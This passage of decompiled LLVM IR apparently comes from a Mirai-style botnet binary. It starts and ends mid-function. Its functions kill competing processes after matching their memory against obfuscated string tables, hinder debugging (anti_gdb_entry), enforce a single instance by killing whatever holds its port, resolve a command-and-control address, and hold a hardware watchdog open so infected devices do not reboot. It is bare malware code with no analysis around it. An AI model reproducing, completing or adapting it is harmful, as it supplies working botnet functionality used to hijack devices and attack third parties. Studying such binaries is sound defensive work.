  %v3_d3d8 = call i32 @table_retrieve_val(i32 33, i32* %v2_d3d8)
  %v0_d3dc = load i32, i32* @r5, align 4
  %v1_d3dc = add i32 %v0_d3dc, -1
  store i32 %v1_d3dc, i32* @r1, align 4
  store i32 %v3_d3d8, i32* %r2.global-to-local, align 4
  %v4_d3e8 = call i32 @util_stristr(i8* %v2_d140, i32 %v1_d3dc, i32 %v3_d3d8)
  %v7_d3ec = icmp eq i32 %v4_d3e8, -1
  br i1 %v7_d3ec, label %dec_label_pc_d408, label %dec_label_pc_d3f4

dec_label_pc_d3f4:                                ; preds = %dec_label_pc_d3bc
  %v1_d3f8 = call i32 @unlink(i32 %v1_d130)
  %v0_d3fc = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d404 = call i32 @kill(i32 %v0_d3fc, i32 9)
  br label %dec_label_pc_d408

dec_label_pc_d408:                                ; preds = %dec_label_pc_d3bc, %dec_label_pc_d3f4
  %v1_d40c = call i32 @table_lock_val(i32 33)
  %v1_d410 = call i32 @__getpid(i32 %v1_d40c)
  store i32 %v1_d410, i32* @r0, align 4
  %v1_d414 = load i32, i32* @r7, align 4
  %v9_d414 = icmp eq i32 %v1_d410, %v1_d414
  br i1 %v9_d414, label %dec_label_pc_d440, label %dec_label_pc_d41c

dec_label_pc_d41c:                                ; preds = %dec_label_pc_d408
  %v0_d41c = call i32 @getppid()
  %v1_d420 = load i32, i32* @r7, align 4
  %v9_d420 = icmp eq i32 %v0_d41c, %v1_d420
  br i1 %v9_d420, label %dec_label_pc_d440, label %dec_label_pc_d428

dec_label_pc_d428:                                ; preds = %dec_label_pc_d41c
  %v2_d430 = load i32, i32* @global_var_24730.78, align 4
  store i32 %v2_d430, i32* %r1.global-to-local, align 4
  %v3_d434 = call i32 @util_strcmp(i8* %v2_d140, i32 %v2_d430)
  %v2_d438 = icmp eq i32 %v3_d434, 0
  br i1 %v2_d438, label %dec_label_pc_d44c, label %dec_label_pc_d428.dec_label_pc_d440_crit_edge

dec_label_pc_d428.dec_label_pc_d440_crit_edge:    ; preds = %dec_label_pc_d428
  %v0_d444.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d440

dec_label_pc_d440:                                ; preds = %dec_label_pc_d428.dec_label_pc_d440_crit_edge, %dec_label_pc_d41c, %dec_label_pc_d408
  %v0_d444 = phi i32 [ %v0_d444.pre, %dec_label_pc_d428.dec_label_pc_d440_crit_edge ], [ %v0_d41c, %dec_label_pc_d41c ], [ %v1_d410, %dec_label_pc_d408 ]
  store i32 %v2_d2d0, i32* @r4, align 4
  store i32 %v0_d444, i32* @r5, align 4
  br label %dec_label_pc_d220.backedge

dec_label_pc_d220.backedge:                       ; preds = %dec_label_pc_d284, %dec_label_pc_d27c, %dec_label_pc_d230, %dec_label_pc_d440, %dec_label_pc_d618, %.thread10
  %stack_var_-8412.1.be = phi i32 [ %v1_d254, %dec_label_pc_d618 ], [ %v1_d254, %dec_label_pc_d440 ], [ %v1_d254, %.thread10 ], [ %stack_var_-8412.2, %dec_label_pc_d230 ], [ %v1_d254, %dec_label_pc_d27c ], [ %v1_d254, %dec_label_pc_d284 ]
  %v0_d220 = load i32, i32* @sb, align 4
  %v1_d224 = inttoptr i32 %v0_d220 to i32*
  %v2_d224 = call i32 @__GI_readdir(i32* %v1_d224)
  %v2_d228 = icmp eq i32 %v2_d224, 0
  br i1 %v2_d228, label %dec_label_pc_d2c0, label %dec_label_pc_d230.preheader

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d428
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d454 = call i32 @__libc_open(i32 %v1_d130, i32 0)
  %v7_d458 = icmp eq i32 %v2_d454, -1
  store i32 %v2_d454, i32* @r4, align 4
  br i1 %v7_d458, label %bb161, label %.thread12

bb161:                                            ; preds = %dec_label_pc_d44c
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d44c, %bb161
  store i32 54380, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d458, i32 ptrtoint (i32* @global_var_10c64.80 to i32))
  %v0_d46c = load i32, i32* @r4, align 4
  %v1_d470 = call i32 @__GI___libc_close(i32 %v0_d46c)
  br label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d2cc, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d480 = call i32 @__libc_open(i32 %v2_d2fc, i32 0)
  %v7_d484 = icmp eq i32 %v2_d480, -1
  store i32 %v2_d480, i32* @fp, align 4
  br i1 %v7_d484, label %dec_label_pc_d618, label %dec_label_pc_d490

dec_label_pc_d490:                                ; preds = %dec_label_pc_d474
  %v1_d494 = call i32 @table_unlock_val(i32 20)
  %v1_d49c = call i32 @table_unlock_val(i32 21)
  %v1_d4a4 = call i32 @table_unlock_val(i32 22)
  store i32 %v2_d4ac, i32* %r1.global-to-local, align 4
  %v3_d4b4 = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v2_d4bc, i32* %r1.global-to-local, align 4
  store i32 %v3_d4b4, i32* @r6, align 4
  %v3_d4c8 = call i32 @table_retrieve_val(i32 21, i32* nonnull %stack_var_-48)
  store i32 %v3_d4c8, i32* @r8, align 4
  store i32 %v2_d4d4, i32* %r1.global-to-local, align 4
  %v3_d4dc = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-52)
  store i32 %v3_d4dc, i32* @sl, align 4
  store i32 %v2_d4e8, i32* @r4, align 4
  %v0_d4ec76 = load i32, i32* @fp, align 4
  store i32 %v2_d4e8, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d4f877 = call i32 @__libc_read(i32 %v0_d4ec76)
  %tmp162 = icmp slt i32 %v1_d4f877, 1
  br i1 %tmp162, label %dec_label_pc_d64c, label %dec_label_pc_d504

dec_label_pc_d504:                                ; preds = %dec_label_pc_d490, %dec_label_pc_d4ec.backedge
  %v0_d55467 = phi i32 [ %v1_d4f8, %dec_label_pc_d4ec.backedge ], [ %v1_d4f877, %dec_label_pc_d490 ]
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  %v3_d508 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d508, i32* @r5, align 4
  %v5_d510 = icmp slt i32 %v0_d55467, %v3_d508
  br i1 %v5_d510, label %dec_label_pc_d520, label %dec_label_pc_d590.lr.ph

dec_label_pc_d590.lr.ph:                          ; preds = %dec_label_pc_d504
  %v1_d58850 = add i32 %v0_d55467, -1
  store i32 %v1_d58850, i32* %r1.global-to-local, align 4
  %v0_d590.pre = load i32, i32* @r6, align 4
  %v1_d594.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d590

dec_label_pc_d520:                                ; preds = %dec_label_pc_d588.backedge, %dec_label_pc_d504
  store i32 %v2_cf90, i32* %r2.global-to-local, align 4
  %v3_d524 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d524, i32* @r5, align 4
  %v5_d52c = icmp slt i32 %v0_d55467, %v3_d524
  br i1 %v5_d52c, label %dec_label_pc_d53c, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_d520
  %v1_d5bc59 = add i32 %v0_d55467, -1
  store i32 %v1_d5bc59, i32* %r1.global-to-local, align 4
  %v2_d5bc60 = icmp eq i32 %v0_d55467, 0
  br i1 %v2_d5bc60, label %dec_label_pc_d53c, label %dec_label_pc_d5c4.lr.ph

dec_label_pc_d5c4.lr.ph:                          ; preds = %.thread28
  %v0_d5c4.pre = load i32, i32* @r8, align 4
  %v1_d5c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d5c4

dec_label_pc_d53c:                                ; preds = %dec_label_pc_d5bc.backedge, %.thread28, %dec_label_pc_d520
  store i32 %v2_cf90, i32* @r3, align 4
  %v3_d540 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_d540, i32* @lr, align 4
  %v5_d548 = icmp slt i32 %v0_d55467, %v3_d540
  br i1 %v5_d548, label %dec_label_pc_d4ec.backedge, label %.thread34

dec_label_pc_d4ec.backedge:                       ; preds = %dec_label_pc_d570, %.thread34, %dec_label_pc_d53c
  %v0_d4ec = load i32, i32* @fp, align 4
  store i32 %v2_d4e8, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d4f8 = call i32 @__libc_read(i32 %v0_d4ec)
  %tmp163 = icmp slt i32 %v1_d4f8, 1
  br i1 %tmp163, label %dec_label_pc_d64c, label %dec_label_pc_d504

.thread34:                                        ; preds = %dec_label_pc_d53c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d55469 = icmp eq i32 %v0_d55467, 0
  br i1 %v2_d55469, label %dec_label_pc_d4ec.backedge, label %dec_label_pc_d55c.lr.ph

dec_label_pc_d55c.lr.ph:                          ; preds = %.thread34
  %v0_d55c.pre = load i32, i32* @sl, align 4
  %v1_d560.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d55c

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d55c.lr.ph
  %v0_d554.in = phi i32 [ %v0_d55467, %dec_label_pc_d55c.lr.ph ], [ %v0_d554, %dec_label_pc_d570 ]
  %v0_d570 = phi i32 [ 0, %dec_label_pc_d55c.lr.ph ], [ %v1_d570, %dec_label_pc_d570 ]
  %v1_d55c = phi i32 [ 0, %dec_label_pc_d55c.lr.ph ], [ %v1_d55c116, %dec_label_pc_d570 ]
  %v0_d554 = add i32 %v0_d554.in, -1
  %v2_d55c = add i32 %v1_d55c, %v0_d55c.pre
  %v3_d55c = inttoptr i32 %v2_d55c to i8*
  %v4_d55c = load i8, i8* %v3_d55c, align 1
  %v6_d55c = zext i8 %v4_d55c to i32
  store i32 %v6_d55c, i32* %r2.global-to-local, align 4
  %v2_d560 = add i32 %v0_d570, %v1_d560.pre
  %v3_d560 = inttoptr i32 %v2_d560 to i8*
  %v4_d560 = load i8, i8* %v3_d560, align 1
  %v6_d560 = zext i8 %v4_d560 to i32
  store i32 %v6_d560, i32* @r3, align 4
  %v9_d564 = icmp eq i8 %v4_d560, %v4_d55c
  br i1 %v9_d564, label %dec_label_pc_d5e0, label %bb164

bb164:                                            ; preds = %dec_label_pc_d55c
  br label %dec_label_pc_d570

dec_label_pc_d570:                                ; preds = %bb164, %dec_label_pc_d5e0
  %v1_d55c116 = phi i32 [ %v1_d5e0, %dec_label_pc_d5e0 ], [ 0, %bb164 ]
  %v1_d570 = add i32 %v0_d570, 1
  store i32 %v1_d570, i32* %r1.global-to-local, align 4
  %v2_d554 = icmp eq i32 %v0_d554, 0
  br i1 %v2_d554, label %dec_label_pc_d4ec.backedge, label %dec_label_pc_d55c

dec_label_pc_d578:                                ; preds = %dec_label_pc_d590
  %v1_d578 = add i32 %v1_d590, 1
  store i32 %v1_d578, i32* @lr, align 4
  %v9_d57c = icmp eq i32 %v3_d508, %v1_d578
  br i1 %v9_d57c, label %dec_label_pc_d5ec, label %dec_label_pc_d588.backedge

dec_label_pc_d588.backedge:                       ; preds = %dec_label_pc_d578, %dec_label_pc_d5a4
  %v1_d59098 = phi i32 [ 0, %dec_label_pc_d5a4 ], [ %v1_d578, %dec_label_pc_d578 ]
  %storemerge86 = add i32 %storemerge86.in, 1
  %v1_d588 = add i32 %v0_d588, -1
  store i32 %v1_d588, i32* %r1.global-to-local, align 4
  %v2_d588 = icmp eq i32 %v0_d588, 0
  br i1 %v2_d588, label %dec_label_pc_d520, label %dec_label_pc_d590

dec_label_pc_d590:                                ; preds = %dec_label_pc_d588.backedge, %dec_label_pc_d590.lr.ph
  %v0_d588 = phi i32 [ %v1_d58850, %dec_label_pc_d590.lr.ph ], [ %v1_d588, %dec_label_pc_d588.backedge ]
  %storemerge86.in = phi i32 [ 0, %dec_label_pc_d590.lr.ph ], [ %storemerge86, %dec_label_pc_d588.backedge ]
  %v1_d590 = phi i32 [ 0, %dec_label_pc_d590.lr.ph ], [ %v1_d59098, %dec_label_pc_d588.backedge ]
  %v2_d590 = add i32 %v1_d590, %v0_d590.pre
  %v3_d590 = inttoptr i32 %v2_d590 to i8*
  %v4_d590 = load i8, i8* %v3_d590, align 1
  %v6_d590 = zext i8 %v4_d590 to i32
  store i32 %v6_d590, i32* %r2.global-to-local, align 4
  %v2_d594 = add i32 %storemerge86.in, %v1_d594.pre
  %v3_d594 = inttoptr i32 %v2_d594 to i8*
  %v4_d594 = load i8, i8* %v3_d594, align 1
  %v6_d594 = zext i8 %v4_d594 to i32
  store i32 %v6_d594, i32* %r3.global-to-local, align 4
  %v9_d598 = icmp eq i8 %v4_d594, %v4_d590
  br i1 %v9_d598, label %dec_label_pc_d578, label %dec_label_pc_d5a4

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d590
  br label %dec_label_pc_d588.backedge

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d5c4
  %v1_d5ac = add i32 %v1_d5c4, 1
  store i32 %v1_d5ac, i32* @lr, align 4
  %v9_d5b0 = icmp eq i32 %v3_d524, %v1_d5ac
  br i1 %v9_d5b0, label %dec_label_pc_d5ec, label %dec_label_pc_d5bc.backedge

dec_label_pc_d5bc.backedge:                       ; preds = %dec_label_pc_d5ac, %dec_label_pc_d5d8
  %v1_d5c4107 = phi i32 [ 0, %dec_label_pc_d5d8 ], [ %v1_d5ac, %dec_label_pc_d5ac ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d5bc = add i32 %v0_d5bc, -1
  store i32 %v1_d5bc, i32* %r1.global-to-local, align 4
  %v2_d5bc = icmp eq i32 %v0_d5bc, 0
  br i1 %v2_d5bc, label %dec_label_pc_d53c, label %dec_label_pc_d5c4

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d5bc.backedge, %dec_label_pc_d5c4.lr.ph
  %v0_d5bc = phi i32 [ %v1_d5bc59, %dec_label_pc_d5c4.lr.ph ], [ %v1_d5bc, %dec_label_pc_d5bc.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d5c4.lr.ph ], [ %storemerge, %dec_label_pc_d5bc.backedge ]
  %v1_d5c4 = phi i32 [ 0, %dec_label_pc_d5c4.lr.ph ], [ %v1_d5c4107, %dec_label_pc_d5bc.backedge ]
  %v2_d5c4 = add i32 %v1_d5c4, %v0_d5c4.pre
  %v3_d5c4 = inttoptr i32 %v2_d5c4 to i8*
  %v4_d5c4 = load i8, i8* %v3_d5c4, align 1
  %v6_d5c4 = zext i8 %v4_d5c4 to i32
  store i32 %v6_d5c4, i32* %r2.global-to-local, align 4
  %v2_d5c8 = add i32 %storemerge.in, %v1_d5c8.pre
  %v3_d5c8 = inttoptr i32 %v2_d5c8 to i8*
  %v4_d5c8 = load i8, i8* %v3_d5c8, align 1
  %v6_d5c8 = zext i8 %v4_d5c8 to i32
  store i32 %v6_d5c8, i32* %r3.global-to-local, align 4
  %v9_d5cc = icmp eq i8 %v4_d5c8, %v4_d5c4
  br i1 %v9_d5cc, label %dec_label_pc_d5ac, label %dec_label_pc_d5d8

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d5c4
  br label %dec_label_pc_d5bc.backedge

dec_label_pc_d5e0:                                ; preds = %dec_label_pc_d55c
  %v1_d5e0 = add i32 %v1_d55c, 1
  %v9_d5e4 = icmp eq i32 %v3_d540, %v1_d5e0
  br i1 %v9_d5e4, label %dec_label_pc_d5ec, label %dec_label_pc_d570

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d578, %dec_label_pc_d5ac, %dec_label_pc_d5e0
  %v1_d5f0 = call i32 @table_lock_val(i32 20)
  %v1_d5f8 = call i32 @table_lock_val(i32 21)
  %v1_d600 = call i32 @table_lock_val(i32 22)
  %v0_d604 = load i32, i32* @fp, align 4
  %v1_d608 = call i32 @__GI___libc_close(i32 %v0_d604)
  %v0_d60c = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d614 = call i32 @kill(i32 %v0_d60c, i32 9)
  br label %dec_label_pc_d618

dec_label_pc_d618:                                ; preds = %dec_label_pc_d474, %dec_label_pc_d64c, %dec_label_pc_d5ec
  store i32 %v2_d2fc, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d624 = call i32 @util_zero()
  store i32 %v2_d34c, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d634 = call i32 @util_zero()
  %v1_d63c = call i32 @sleep(i32 1)
  store i32 %v2_d2d0, i32* @r4, align 4
  %v0_d644 = load i32, i32* @r7, align 4
  store i32 %v0_d644, i32* @r5, align 4
  br label %dec_label_pc_d220.backedge

dec_label_pc_d64c:                                ; preds = %dec_label_pc_d4ec.backedge, %dec_label_pc_d490
  %v1_d650 = call i32 @table_lock_val(i32 20)
  %v1_d658 = call i32 @table_lock_val(i32 21)
  %v1_d660 = call i32 @table_lock_val(i32 22)
  %v0_d664 = load i32, i32* @fp, align 4
  %v1_d668 = call i32 @__GI___libc_close(i32 %v0_d664)
  br label %dec_label_pc_d618

; uselistorder directives
  uselistorder i32 %v1_d5e0, { 1, 0 }
  uselistorder i32 %v1_d570, { 1, 0 }
  uselistorder i32 %v1_d55c, { 1, 0 }
  uselistorder i32 %v0_d570, { 1, 0 }
  uselistorder i32 %v1_d4f8, { 1, 0 }
  uselistorder i32 %v2_d480, { 1, 0 }
  uselistorder i1 %v7_d458, { 1, 0 }
  uselistorder i32 %v2_d454, { 1, 0 }
  uselistorder i32 %v2_d224, { 1, 0 }
  uselistorder i32 %stack_var_-8412.1.be, { 1, 0 }
  uselistorder i32 %v3_d3ac, { 1, 2, 0 }
  uselistorder i32 %v2_d2b4, { 1, 0 }
  uselistorder i32 %v1_d254, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d230, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8412.0, { 1, 0 }
  uselistorder i32 %v2_d4e8, { 1, 0, 2 }
  uselistorder i32 %v2_d34c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_d2fc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_d1c8, { 1, 0 }
  uselistorder i32 %v2_d194, { 2, 0, 1 }
  uselistorder i32 %v3_d140, { 1, 0 }
  uselistorder i32 %v1_d130, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_d0b4, { 1, 2, 0 }
  uselistorder i32 %v3_d060, { 1, 2, 0 }
  uselistorder i32 %v3_d00c, { 1, 2, 0 }
  uselistorder i32 %v3_cfc0, { 1, 2, 0 }
  uselistorder i32 %storemerge126, { 1, 0 }
  uselistorder i32 %v0_cf54, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-68, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 5, 4, 51, 1, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24730.78, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24734.70, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d618, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d5ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d5bc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d588.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d570, { 1, 0 }
  uselistorder label %dec_label_pc_d504, { 1, 0 }
  uselistorder label %dec_label_pc_d474, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d220.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d408, { 1, 0 }
  uselistorder label %dec_label_pc_d230, { 1, 0 }
  uselistorder label %dec_label_pc_d230.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_d0e0, { 1, 0 }
  uselistorder label %dec_label_pc_d08c, { 1, 0 }
  uselistorder label %dec_label_pc_d038, { 1, 0 }
  uselistorder label %dec_label_pc_cfec, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d7fc.82 to i32), i32* @global_var_21aa0.84, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d698 = load i32, i32* @r6, align 4
  %v12_d698 = load i32, i32* @r7, align 4
  %v15_d698 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d6b4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_21a98.86 to i32), i32* @r6, align 4
  %v7_d6bc = icmp eq i32 %v3_d6b4, -1
  store i32 %v3_d6b4, i32* @global_var_21a98.86, align 4
  br i1 %v7_d6bc, label %dec_label_pc_d774, label %dec_label_pc_d6c8

dec_label_pc_d6c8:                                ; preds = %entry
  %v2_d6c8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d6c8, i32* @r3, align 4
  %v0_d6cc = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d6dc = call i32 @__GI_setsockopt(i32 %v3_d6b4, i32 %v0_d6cc, i32 2, i32 %v2_d6c8, i32 4)
  %v2_d6e0 = load i32, i32* @global_var_21a98.86, align 4
  store i32 %v2_d6e0, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d6f0 = call i32 @__libc_fcntl(i32 %v2_d6e0, i32 3)
  %v0_d6f4 = load i32, i32* @r5, align 4
  %v1_d6f8 = or i32 %v2_d6f0, 2048
  store i32 %v1_d6f8, i32* @r2, align 4
  %v0_d6fc = load i32, i32* @r4, align 4
  %v2_d700 = call i32 @__libc_fcntl(i32 %v0_d6fc, i32 %v0_d6f4)
  store i32 ptrtoint (i8** @global_var_21aa4.88 to i32), i32* @r8, align 4
  %v2_d708 = load i8, i8* bitcast (i8** @global_var_21aa4.88 to i8*), align 4
  %v2_d70c = icmp eq i8 %v2_d708, 0
  br i1 %v2_d70c, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_d6c8
  br label %bb20

bb:                                               ; preds = %dec_label_pc_d6c8
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_d730 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d738 = inttoptr i32 %v0_d730 to i32*
  store i32 0, i32* %v2_d738, align 4
  %v2_d73c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d73c, i32* @r5, align 4
  store i32 %v0_d730, i32* @r4, align 4
  %v2_d74c = load i32, i32* @global_var_21a98.86, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d758 = call i32 @bind(i32 %v2_d74c, i32 %v2_d73c, i32 16)
  %v7_d75c = icmp eq i32 %v3_d758, -1
  br i1 %v7_d75c, label %dec_label_pc_d780, label %dec_label_pc_d764

dec_label_pc_d764:                                ; preds = %bb20
  %v2_d76c = load i32, i32* @global_var_21a98.86, align 4
  %v2_d770 = call i32 @listen(i32 %v2_d76c, i32 1)
  br label %dec_label_pc_d774

dec_label_pc_d774:                                ; preds = %entry, %dec_label_pc_d78c, %dec_label_pc_d764
  %v1_d77c = phi i32 [ %v3_d6b4, %entry ], [ %v1_d7d4, %dec_label_pc_d78c ], [ %v2_d770, %dec_label_pc_d764 ]
  store i32 %v9_d698, i32* @r6, align 4
  store i32 %v12_d698, i32* @r7, align 4
  store i32 %v15_d698, i32* @r8, align 4
  ret i32 %v1_d77c

dec_label_pc_d780:                                ; preds = %bb20
  %v0_d780 = load i32, i32* @r4, align 4
  %v1_d780 = inttoptr i32 %v0_d780 to i32*
  %v2_d780 = load i32, i32* %v1_d780, align 4
  %v7_d784 = icmp eq i32 %v2_d780, 99
  br i1 %v7_d784, label %dec_label_pc_d7dc, label %dec_label_pc_d78c

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d7dc, %bb21, %dec_label_pc_d780
  %v2_d7a4 = load i32, i32* @global_var_21a98.86, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d7b4 = call i32 @__libc_connect(i32 %v2_d7a4, i32 %v2_d73c, i32 16)
  %v1_d7bc = call i32 @sleep(i32 5)
  %v2_d7c0 = load i32, i32* @global_var_21a98.86, align 4
  %v1_d7c4 = call i32 @__GI___libc_close(i32 %v2_d7c0)
  %v1_d7d0 = call i32 @killer_kill_by_port(i32 48647)
  %v1_d7d4 = call i32 @ensure_single_instance(i32 %v1_d7d0)
  br label %dec_label_pc_d774

dec_label_pc_d7dc:                                ; preds = %dec_label_pc_d780
  %v2_d7dc = load i8, i8* bitcast (i8** @global_var_21aa4.88 to i8*), align 4
  %v3_d7dc = zext i8 %v2_d7dc to i32
  %v1_d7e0 = load i32, i32* @r7, align 4
  %v9_d7e0 = icmp eq i32 %v3_d7dc, %v1_d7e0
  br i1 %v9_d7e0, label %dec_label_pc_d78c, label %bb21

bb21:                                             ; preds = %dec_label_pc_d7dc
  %v2_d7e8 = trunc i32 %v1_d7e0 to i8
  store i8 %v2_d7e8, i8* bitcast (i8** @global_var_21aa4.88 to i8*), align 4
  br label %dec_label_pc_d78c

; uselistorder directives
  uselistorder i32 %v2_d73c, { 1, 0, 2 }
  uselistorder i32 %v3_d6b4, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21aa4.88 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_21aa4.88, { 1, 0 }
  uselistorder label %dec_label_pc_d78c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d774, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_d804 = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint ([15 x i8]* @global_var_1927c.91 to i32), i32* @r0, align 4
  %v2_d80c = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_1927c.91 to i32))
  store i32 ptrtoint (i16** @global_var_24738.93 to i32), i32* @r4, align 4
  store i32 %v2_d80c, i32* @global_var_2473c.94, align 4
  %v3_d820 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_d820 = inttoptr i32 %v3_d820 to i16*
  %v3_d824 = load i16, i16* %v4_d820, align 2
  store i16 %v3_d824, i16* bitcast (i32* @global_var_2473a.95 to i16*), align 4
  %v1_d830 = call i32 @table_lock_val(i32 1)
  ret i32 %v1_d830
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_d844 = load i32, i32* @r4, align 4
  %v6_d844 = load i32, i32* @r5, align 4
  %v0_d84c = call i32 @__libc_fork()
  %v7_d850 = icmp eq i32 %v0_d84c, -1
  %. = zext i1 %v7_d850 to i32
  %tmp11 = icmp slt i32 %v0_d84c, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d86c = icmp eq i32 %storemerge4, 0
  store i32 %v0_d84c, i32* @global_var_21c18.97, align 4
  br i1 %v2_d86c, label %dec_label_pc_d884, label %dec_label_pc_d878

dec_label_pc_d878:                                ; preds = %entry
  store i32 %v3_d844, i32* @r4, align 4
  store i32 %v6_d844, i32* @r5, align 4
  ret i32 %v0_d84c

dec_label_pc_d884:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d890 = call i32 @table_unlock_val(i32 26)
  %v1_d898 = call i32 @table_unlock_val(i32 27)
  %v0_d89c = load i32, i32* @r5, align 4
  %v2_d8a4 = inttoptr i32 %v0_d89c to i32*
  %v3_d8a4 = call i32 @table_retrieve_val(i32 26, i32* %v2_d8a4)
  %v2_d8ac = call i32 @__libc_open(i32 %v3_d8a4, i32 2)
  %v7_d8b0 = icmp eq i32 %v2_d8ac, -1
  store i32 %v2_d8ac, i32* @r4, align 4
  br i1 %v7_d8b0, label %dec_label_pc_d8f8, label %dec_label_pc_d8bc

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_d8f8, %dec_label_pc_d884
  %v0_d8c8 = phi i32 [ %v2_d908, %dec_label_pc_d8f8 ], [ %v2_d8ac, %dec_label_pc_d884 ]
  %v2_d8cc = ptrtoint i32* %stack_var_-20 to i32
  %v3_d8d0 = call i32 @ioctl(i32 %v0_d8c8, i32 -2147199228, i32 %v2_d8cc)
  br label %dec_label_pc_d8d4

dec_label_pc_d8d4:                                ; preds = %dec_label_pc_d8d4, %dec_label_pc_d8bc
  %v0_d8e0 = load i32, i32* @r4, align 4
